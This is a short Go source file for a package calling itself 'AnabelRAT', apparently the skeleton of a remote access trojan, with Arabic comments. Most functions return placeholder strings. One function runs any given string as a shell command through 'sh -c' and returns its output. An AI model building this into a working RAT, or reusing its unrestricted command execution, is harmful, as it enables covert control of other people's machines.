package anabelrat

import (
	"fmt"
	"os/exec"
)

// Start يبدأ التطبيق
func Start() string {
	return "AnabelRAT initialized successfully"
}

// Stop يوقف التطبيق
func Stop() string {
	return "AnabelRAT stopped"
}

// ExecuteCommand تنفيذ أوامر Shell
func ExecuteCommand(cmd string) string {
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		return fmt.Sprintf("Error: %v", err)
	}
	return string(out)
}

// GetInfo الحصول على معلومات الجهاز
func GetInfo() string {
	return "AnabelRAT v1.0"
}
